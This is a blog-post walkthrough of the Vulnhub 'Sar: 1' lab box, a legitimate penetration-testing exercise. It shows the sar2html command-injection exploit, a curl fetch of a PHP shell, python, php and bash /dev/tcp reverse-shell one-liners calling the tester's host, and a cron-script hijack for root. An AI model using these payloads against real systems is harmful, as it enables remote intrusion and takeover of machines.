@@ -1,0 +1,192 @@
+---
+title: Test Post
+author: tactinix
+date: 2021-02-07
+categories: [Walk-throughs]
+tags: [Vulnhub-Boxes]
+math: true
+mermaid: true
+---
+
+
+
+Solving this box involve taking advantage of an vulnerability in the Sar2HTML web application, then making use of the cron scheduler to gain root on the box.
+
+### About the box
+-   **Name**: Sar: 1
+-   **Date release**: 15 Feb 2020
+-   **Author**: [Love](https://www.vulnhub.com/author/love,669/)
+-   **Series**: [Sar](https://www.vulnhub.com/series/sar,276/)
+
+### Description on Vulnhub
+Sar is an OSCP-Like VM with the intent of gaining experience in the world of penetration testing.
+
+### Recon
+
+Starting off with `nmap` and `gobuster`.
+
+`sudo nmap -sC -sV -oA nmap.initial 192.168.178.120`
+
+reveals;
+
+```# Nmap 7.91 scan initiated Sun Feb  7 10:39:36 2021 as: nmap -sC -sV -oA nmap.initial 192.168.178.120
+Nmap scan report for sar.fritz.box (192.168.178.120)
+Host is up (0.00013s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+MAC Address: 08:00:27:82:2A:C6 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done at Sun Feb  7 10:39:43 2021 -- 1 IP address (1 host up) scanned in 6.73 seconds
+```
+
+Only one port open, port 80.
+
+`gobuster dir -w ~/wordlists/SecLists/Discovery/Web-Content/raft-large-files-lowercase.txt -u 192.168.178.120 -o gobuster.out`
+
+get the following;
+
+```/index.html           (Status: 200) [Size: 10918]
+/.htaccess            (Status: 403) [Size: 280]
+/robots.txt           (Status: 200) [Size: 9]
+/.                    (Status: 200) [Size: 10918]
+/phpinfo.php          (Status: 200) [Size: 95426]
+/.html                (Status: 403) [Size: 280]
+/.php                 (Status: 403) [Size: 280]
+/.htpasswd            (Status: 403) [Size: 280]
+/.htm                 (Status: 403) [Size: 280]
+/.htpasswds           (Status: 403) [Size: 280]
+/.htgroup             (Status: 403) [Size: 280]
+/wp-forum.phps        (Status: 403) [Size: 280]
+/.htaccess.bak        (Status: 403) [Size: 280]
+/.htuser              (Status: 403) [Size: 280]
+/.htc                 (Status: 403) [Size: 280]
+/.ht                  (Status: 403) [Size: 280]
+/.htaccess.old        (Status: 403) [Size: 280]
+/.htacess             (Status: 403) [Size: 280]
+```
+
+Initial site on port 80 is the standard "It works" page.
+
+![](/images/img/sar/20210207105159.png)
+
+Nmap did point to a `robots.txt` which only contains a reference to `sar2HTML`
+
+/sar2HTML
+
+![](/images/img/sar/20210207105542.png)
+
+Gobuster found /phpinfo.php
+
+![](/images/img/sar/20210207105643.png)
+
+So, what is `sar2html`?
+According to the page on Sourceforge, it's a
+
+`Sar2html is web based frontend for performance monitoring. It converts sar binary data to graphical format and keep historical data in it's library. Both command line and web interface provide same functionality.`
+See [Sourceforge](https://sourceforge.net/projects/sar2html/#:~:text=Sar2html%20is%20web%20based%20frontend,web%20interface%20provide%20same%20functionality.&text=Then%20you%20may%20plot%20performance,pdf%20file%20format%20through%20sar2html).
+The `sar` command as per Ubuntu manpages,
+
+`sar - Collect, report, or save system activity information.`
+
+Provided by: [sysstat\_11.6.1-1\_amd64](https://launchpad.net/ubuntu/bionic/+package/sysstat) 
+
+The related [Ubuntu manpage](http://manpages.ubuntu.com/manpages/bionic/man1/sar.sysstat.1.html)
+
+
+
+
+Sar2HTML 3.2.1, the version on the box, has an exploit listed on [Exploitdb](https://www.exploit-db.com/exploits/47204).
+
+```txt
+# Exploit Title: sar2html Remote Code Execution
+# Date: 01/08/2019
+# Exploit Author: Furkan KAYAPINAR
+# Vendor Homepage:https://github.com/cemtan/sar2html 
+# Software Link: https://sourceforge.net/projects/sar2html/
+# Version: 3.2.1
+# Tested on: Centos 7
+
+In web application you will see index.php?plot url extension.
+
+http://<ipaddr>/index.php?plot=;<command-here> will execute 
+the command you entered. After command injection press "select # host" then your command's 
+output will appear bottom side of the scroll screen.
+            
+```
+
+Putting the exploit to action and testing with `whoami`;
+
+![](/images/img/sar/20210207112123.png)
+
+Some further poking with `ls`;
+
+![](/images/img/sar/20210207112240.png)
+
+### Gaining a shell
+
+From the /phpinfo.php page we know `curl` is enabled, thus we can leverage it to get a reverse shell, something like pentestermonkey's reverse-php-shell.php on the box. However, through the `post` request into Zap, we can also do a `php` reverse connection with `php -r '$sock\=fsockopen("my_ip",my_port);exec("/bin/sh -i <&3 >&3 2>&3");'`.
+
+Option 2, did not work out so well, but going with `curl` did.
+Setting the values and making sure `http://192.168.178.120/sar2HTML/index.php?plot=;curl%20http://192.168.178.79:8000/rs.php` with a `python -m http.server`, also standing up a `nc -lvnp 1337` so long.
+![](/images/img/sar/20210207120342.png)
+
+
+![](/images/img/sar/20210207115625.png)
+
+
+There was definitely a connection, but checking if the script stuck with `ls` did not reveal anything. Doing various `ls`'s' around, I came upon 2 shell scripts in the `app-root`, 
+![](/images/img/sar/20210207121432.png)
+
+Using `wget` to pull them down to look at what they do;
+
+![](/images/img/sar/20210207143210.png)
+
+Looks like `finally.sh` call `write.sh` that can write to `/tmp`,
+something perhaps for later.
+
+
+
+Going further, the `user.txt` flag can be had without a shell;
+
+![](/images/img/sar/20210207122637.png)
+
+
+
+
+It turns out my idea going with a reverse shell `.php` script, might be a brain fart as well, but eventually get a shell on the box with `python`
+The full `python` method being, 
+```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.178.79",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```
+from https://book.hacktricks.xyz/shells/shells/linux#python
+
+with the full URL being `http://192.168.178.120/sar2HTML/index.php?plot=;python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect((%22192.168.178.79%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(%5B%22/bin/sh%22,%22-i%22%5D);%27`
+get a shell on a `nc -lvnp 1234`.
+
+![](/images/img/sar/20210207144748.png)
+
+Pulling LinPEAS.sh and going through the output, the script from before `finally.sh` pops up.
+
+![](/images/img/sar/20210207150023.png)
+
+
+Going further through the output,
+
+
+![](/images/img/sar/20210207152021.png)
+
+So `crontab` it is!
+Firstly, we stand up a `nc -lvnp 1346` to accept the reverse shell when the`crontab` is triggered, then we append our reverse shell command to `write.sh` with a `echo -e "bash -c 'bash -i >& /dev/tcp/192.168.178.79/1346 0>&1'" >> write.sh`.
+
+Wait a bit and viola!
+
+![](/images/img/sar/20210207161653.png)
+
+
+Box solved, got the user flag previously through the web vulnerability and the root flag via a naughty crontab.
+
+Thanks for reading and have the best day ever!
+
+tactinix
